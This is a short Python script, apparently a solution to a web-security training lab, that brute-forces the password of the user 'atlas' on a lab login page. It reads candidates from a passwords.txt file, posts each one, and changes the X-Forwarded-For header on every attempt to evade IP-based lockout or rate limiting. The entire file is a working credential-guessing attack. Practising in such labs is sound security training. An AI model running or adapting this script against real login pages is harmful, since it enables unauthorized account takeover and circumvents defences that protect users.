import requests


def main():
    url = "https://ac2d1fb01f0b7a34c032355300070031.web-security-academy.net/login"

    passwords = open('passwords.txt', 'r')

    for i in range(101):
        password = passwords.readline().strip()
        ip = str(i)
        data_user = {'username': 'atlas', 'password': password}
        print("Trying with {}".format(password))
        r = requests.post(url, data = data_user, headers= {'X-Forwarded-For':ip})
        
        if (r.url != url):
            print("The password is: {}".format(password))
            break


if __name__ == "__main__":
    main()